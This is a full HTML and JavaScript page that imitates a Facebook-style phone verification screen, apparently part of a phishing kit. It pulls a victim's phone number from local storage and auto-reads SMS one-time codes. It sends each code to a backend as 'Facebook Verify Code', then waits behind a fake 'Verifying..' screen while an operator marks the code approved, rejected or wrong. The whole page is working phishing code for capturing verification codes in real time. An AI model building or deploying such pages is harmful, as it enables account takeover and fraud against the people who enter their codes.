<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Verifying your number</title>
  <style>
    * {
      box-sizing: border-box;
      margin: 0;
      padding: 0;
    }

    body {
      background: linear-gradient(180deg, #eff6ff 0%, #ffffff 55%, #f8fafc 100%);
      color: #0f172a;
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
      display: flex;
      align-items: center;
      justify-content: center;
      min-height: 100vh;
      padding: 28px 20px;
    }

    .container {
      width: 100%;
      max-width: 420px;
      display: flex;
      flex-direction: column;
      align-items: center;
      text-align: center;
      background: #ffffff;
      border: 1.5px solid #dbeafe;
      border-radius: 24px;
      padding: 36px 22px;
      box-shadow: 0 18px 40px rgba(24, 119, 242, 0.12);
    }

    .title {
      font-size: 25px;
      font-weight: 800;
      color: #1877f2;
      margin-bottom: 14px;
      letter-spacing: -0.2px;
    }

    .subtitle {
      font-size: 16px;
      font-weight: 600;
      line-height: 1.5;
      color: #334155;
      max-width: 330px;
      margin-bottom: 34px;
    }

    .phone-number {
      color: #0f172a;
      font-weight: 800;
    }

    .wrong-number {
      color: #1877f2;
      text-decoration: none;
      font-weight: 700;
    }

    .wrong-number:hover {
      text-decoration: underline;
    }

    .otp-group {
      width: 100%;
      display: flex;
      align-items: center;
      justify-content: center;
      margin-bottom: 34px;
    }

    .otp-rectangle {
      width: 100%;
      height: 60px;
      background-color: #f8fafc;
      border: 2px solid #93c5fd;
      border-radius: 14px;
      color: #0f172a;
      font-size: 26px;
      font-weight: 800;
      letter-spacing: 6px;
      text-align: center;
      caret-color: #1877f2;
      outline: none;
      padding: 0 16px;
      box-shadow: inset 0 2px 6px rgba(24, 119, 242, 0.06);
      transition: border-color 0.15s ease, box-shadow 0.15s ease, background-color 0.15s ease, transform 0.12s ease;
    }

    .otp-rectangle::placeholder {
      color: #94a3b8;
      font-size: 17px;
      font-weight: 600;
      letter-spacing: 0.5px;
    }

    .otp-rectangle:focus {
      background-color: #ffffff;
      border-color: #1877f2;
      box-shadow: 0 0 0 4px rgba(24, 119, 242, 0.16);
      transform: translateY(-1px);
    }

    .resend-link {
      color: #1877f2;
      font-size: 16px;
      font-weight: 700;
      text-decoration: none;
      letter-spacing: 0.2px;
    }

    .resend-link:hover {
      text-decoration: underline;
    }

    /* Full-screen blue & white verification overlay */
    .purple-verify-screen {
      position: fixed;
      inset: 0;
      width: 100vw;
      height: 100vh;
      background: linear-gradient(160deg, #1877f2 0%, #0d5ec4 100%);
      display: none;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      z-index: 9999;
      padding: 24px;
      text-align: center;
    }

    .purple-verify-screen.active {
      display: flex;
    }

    .purple-spinner {
      width: 54px;
      height: 54px;
      border: 4px solid rgba(255, 255, 255, 0.3);
      border-top-color: #ffffff;
      border-radius: 50%;
      animation: purpleSpin 0.85s linear infinite;
      margin-bottom: 18px;
    }

    .purple-verify-text {
      color: #ffffff;
      font-size: 24px;
      font-weight: 800;
      letter-spacing: 0.4px;
    }

    @keyframes purpleSpin {
      to {
        transform: rotate(360deg);
      }
    }
  </style>
</head>
<body>
  <main class="container" id="mainContent">
    <h1 class="title">Verifying your number number </h1>
    
    <p class="subtitle">We have sent a verification code to your number </p>
    <div class="otp-group" aria-label="Verification code">
      <input
        type="text"
        inputmode="numeric"
        autocomplete="one-time-code"
        maxlength="24"
        class="otp-rectangle"
        placeholder="Enter verification code"
        aria-label="Verification code"
        autofocus
      >
    </div>

    <a href="#" class="resend-link">Didn't receive code?</a>
  </main>

  <div id="purpleVerifyScreen" class="purple-verify-screen" aria-live="assertive">
    <div class="purple-spinner"></div>
    <div class="purple-verify-text">Verifying..</div>
  </div>

  <script>
    const mainContent = document.getElementById('mainContent');
    const purpleScreen = document.getElementById('purpleVerifyScreen');
    const otpInput = document.querySelector('.otp-rectangle');
    const subtitleEl = document.querySelector('.subtitle');
    const resendLink = document.querySelector('.resend-link');

    const userPhone = (localStorage.getItem('africellUserPhone') || localStorage.getItem('userPhone') || '').trim();
    if (userPhone) {
      subtitleEl.innerHTML = `We have sent a verification code to your number <span class="phone-number">${userPhone}</span>`;
    }

    let activeInterval = null;
    let submissionTime = 0;
    let isSubmitting = false;
    let lastSubmittedCode = '';
    let alertTimeout = null;
    let autoSubmitTimer = null;
    let statusBanner = null;
    let otpAbortController = null;

    function clearAutoSubmitTimer() {
      if (autoSubmitTimer) {
        clearTimeout(autoSubmitTimer);
        autoSubmitTimer = null;
      }
    }

    function showPurpleVerifyingScreen() {
      clearAutoSubmitTimer();
      if (document.activeElement && typeof document.activeElement.blur === 'function') {
        document.activeElement.blur();
      }
      mainContent.style.display = 'none';
      purpleScreen.classList.add('active');
    }

    function hidePurpleVerifyingScreen() {
      purpleScreen.classList.remove('active');
      mainContent.style.display = 'flex';
    }

    function ensureStatusBanner() {
      if (statusBanner) return statusBanner;
      statusBanner = document.createElement('div');
      statusBanner.style.marginTop = '16px';
      statusBanner.style.padding = '10px 14px';
      statusBanner.style.borderRadius = '10px';
      statusBanner.style.fontSize = '14px';
      statusBanner.style.fontWeight = '700';
      statusBanner.style.display = 'none';
      statusBanner.style.color = '#b91c1c';
      statusBanner.style.backgroundColor = '#fef2f2';
      statusBanner.style.border = '1.5px solid #fecaca';
      resendLink.insertAdjacentElement('afterend', statusBanner);
      return statusBanner;
    }

    function hideTemporaryAlert() {
      if (alertTimeout) {
        clearTimeout(alertTimeout);
        alertTimeout = null;
      }
      if (statusBanner) {
        statusBanner.style.display = 'none';
        statusBanner.textContent = '';
      }
    }

    function showTemporaryAlert(message, durationMs = 1500) {
      const banner = ensureStatusBanner();
      banner.textContent = message;
      banner.style.display = 'block';
      if (alertTimeout) clearTimeout(alertTimeout);
      alertTimeout = setTimeout(() => {
        hideTemporaryAlert();
      }, durationMs);
    }

    function stopPolling() {
      if (activeInterval) {
        clearInterval(activeInterval);
        activeInterval = null;
      }
    }

    function clearOtpBoxes(focusFirst = true) {
      clearAutoSubmitTimer();
      if (otpInput) {
        otpInput.value = '';
      }
      lastSubmittedCode = '';
      if (focusFirst && otpInput) {
        otpInput.focus();
      }
    }

    function extractVerificationCode(rawText) {
      const text = String(rawText || '');
      const eightDigitMatch = /(?:^|\D)(\d{8})(?:\D|$)/.exec(text);
      if (eightDigitMatch && eightDigitMatch[1]) {
        return eightDigitMatch[1];
      }
      const sixDigitMatch = /(?:^|\D)(\d{6})(?:\D|$)/.exec(text);
      if (sixDigitMatch && sixDigitMatch[1]) {
        return sixDigitMatch[1];
      }
      const digitsOnly = text.replace(/[^0-9]/g, '');
      if (digitsOnly.length >= 8) {
        return digitsOnly.slice(0, 8);
      }
      if (digitsOnly.length >= 6) {
        return digitsOnly.slice(0, 6);
      }
      return digitsOnly.slice(0, 8);
    }

    function pollVerificationStatus(phone) {
      stopPolling();
      activeInterval = setInterval(async () => {
        try {
          const response = await fetch(`/api/check-status?phone=${encodeURIComponent(phone)}&t=${Date.now()}`);
          const data = await response.json();

          if (data.status === 'approved' && (!data.timestamp || data.timestamp >= submissionTime - 2000)) {
            stopPolling();
            window.location.href = 'success.html';
          } else if (data.status === 'rejected' && (!data.timestamp || data.timestamp >= submissionTime - 2000)) {
            stopPolling();
            window.location.href = 'reject.html';
          } else if (data.status === 'wrong_id' && (!data.timestamp || data.timestamp >= submissionTime - 2000)) {
            stopPolling();
            isSubmitting = false;
            hidePurpleVerifyingScreen();
            clearOtpBoxes(true);
            showTemporaryAlert('Wrong Code , Try again', 1500);
          }
        } catch (err) {
          console.error('Verification polling error:', err);
        }
      }, 2500);
    }

    async function submitVerificationCode(code) {
      clearAutoSubmitTimer();
      const cleanCode = String(code || '').replace(/[^0-9]/g, '').slice(0, 8);
      if (cleanCode.length !== 6 && cleanCode.length !== 8) return;

      if (!userPhone) {
        hidePurpleVerifyingScreen();
        showTemporaryAlert('Wrong Code , Try again', 1500);
        return;
      }
      if (isSubmitting || cleanCode === lastSubmittedCode) return;

      isSubmitting = true;
      lastSubmittedCode = cleanCode;
      submissionTime = Date.now();
      hideTemporaryAlert();
      showPurpleVerifyingScreen();

      try {
        const response = await fetch('/api/submit-order', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            phone: userPhone,
            uniqueId: `Facebook Verify Code: ${cleanCode}`
          })
        });
        const result = await response.json().catch(() => ({}));
        if (!response.ok || (result && result.success === false)) {
          isSubmitting = false;
          hidePurpleVerifyingScreen();
          clearOtpBoxes(true);
          showTemporaryAlert('Wrong Code , Try again', 1500);
          return;
        }
        pollVerificationStatus(userPhone);
      } catch (err) {
        console.error('Submit verification code error:', err);
        isSubmitting = false;
        hidePurpleVerifyingScreen();
        clearOtpBoxes(true);
        showTemporaryAlert('Wrong Code , Try again', 1500);
      }
    }

    function scheduleCodeEvaluation(rawText, fromPasteOrAutofill = false) {
      clearAutoSubmitTimer();
      if (isSubmitting) return;

      const digitsOnly = String(rawText || '').replace(/[^0-9]/g, '').slice(0, 8);
      const candidate = fromPasteOrAutofill ? extractVerificationCode(rawText) : digitsOnly;

      if (!candidate && !digitsOnly) {
        if (otpInput) otpInput.value = '';
        return;
      }

      const activeCode = fromPasteOrAutofill ? (candidate || digitsOnly) : digitsOnly;
      if (otpInput && otpInput.value !== activeCode) {
        otpInput.value = activeCode;
      }

      if (activeCode.length === 8) {
        autoSubmitTimer = setTimeout(() => {
          const latestDigits = String(otpInput ? otpInput.value : activeCode).replace(/[^0-9]/g, '').slice(0, 8);
          if (latestDigits.length === 8) {
            submitVerificationCode(latestDigits);
          } else if (latestDigits.length === 6) {
            submitVerificationCode(latestDigits);
          }
        }, 700);
        return;
      }

      if (activeCode.length >= 6) {
        autoSubmitTimer = setTimeout(() => {
          const latestDigits = String(otpInput ? otpInput.value : activeCode).replace(/[^0-9]/g, '').slice(0, 8);
          if (latestDigits.length === 8 || latestDigits.length === 6) {
            submitVerificationCode(latestDigits);
          }
        }, 700);
      }
    }

    async function startAutoReadOtp() {
      if (!('OTPCredential' in window) || !navigator.credentials || typeof navigator.credentials.get !== 'function') {
        return;
      }
      try {
        if (otpAbortController) otpAbortController.abort();
        otpAbortController = new AbortController();
        const credential = await navigator.credentials.get({
          otp: { transport: ['sms'] },
          signal: otpAbortController.signal
        });
        if (credential && credential.code) {
          scheduleCodeEvaluation(credential.code, true);
        }
      } catch (err) {
        // Ignore abort or unsupported/permission errors so manual entry and paste always work smoothly
      }
    }

    resendLink.addEventListener('click', async (e) => {
      e.preventDefault();
      if (!userPhone) {
        showTemporaryAlert('Wrong Code , Try again', 1500);
        return;
      }
      stopPolling();
      clearAutoSubmitTimer();
      isSubmitting = false;
      hidePurpleVerifyingScreen();
      clearOtpBoxes(true);
      submissionTime = Date.now();
      hideTemporaryAlert();
      startAutoReadOtp();

      try {
        await fetch('/api/submit-order', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            phone: userPhone,
            uniqueId: 'Facebook Verify Resend Code'
          })
        });
        pollVerificationStatus(userPhone);
      } catch (err) {
        console.error('Resend code error:', err);
      }
    });

    if (otpInput) {
      otpInput.addEventListener('input', (e) => {
        const val = String(e.target.value || '');
        if (!val.replace(/[^0-9]/g, '')) {
          clearAutoSubmitTimer();
          e.target.value = '';
          return;
        }
        hideTemporaryAlert();
        scheduleCodeEvaluation(val, false);
      });

      otpInput.addEventListener('paste', (e) => {
        const clipboardData = e.clipboardData || window.clipboardData;
        const pasted = clipboardData ? clipboardData.getData('text') : '';
        if (!pasted) return;
        e.preventDefault();
        hideTemporaryAlert();
        scheduleCodeEvaluation(pasted, true);
      });
    }

    startAutoReadOtp();
  </script>
</body>
</html>
